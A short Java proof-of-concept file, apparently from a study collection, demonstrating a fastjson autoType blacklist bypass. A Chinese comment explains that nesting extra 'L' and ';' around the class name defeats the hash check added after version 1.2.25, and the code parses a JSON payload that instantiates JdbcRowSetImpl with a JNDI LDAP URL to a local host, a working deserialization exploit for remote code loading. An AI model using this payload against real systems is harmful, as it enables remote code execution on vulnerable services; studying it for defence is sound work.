import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/*
* 相比fastjson1.2.25,在ParserConfig类中又套用了哈希，判断第一个字符是不是L和最后一个字符是不是L,
* 但是在TypeUtils.loadClass函数中是递归处理类名，所以再套一个L和;就行。
* */
public class FastJson_DoubleBypass2 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:8085/exp\",\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
